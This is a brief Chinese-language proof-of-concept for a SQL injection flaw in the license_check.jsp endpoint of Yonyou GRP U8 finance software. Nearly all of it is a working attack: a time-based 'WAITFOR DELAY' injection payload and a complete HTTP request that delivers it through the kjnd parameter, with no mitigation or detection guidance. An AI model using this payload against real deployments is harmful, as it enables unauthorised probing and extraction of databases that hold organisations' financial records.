
## 用友 GRP U8 license_check.jsp 存在SQL注入

## sql注入payload
```
';WAITFOR DELAY '0:0:5'-- q
```

## poc
```

GET /u8qx/license_check.jsp?kjnd=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Connection: close
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Lc4ILVKo1g8Fcvju7pia1Lgsn9t5LBBrZibkYPnsDqIIA3LNhWdFso2I2DMibJJ4DQZbvCibWlRJJqfeib7ZiafvQiceA/640?wx_fmt=png&wxfrom=13)
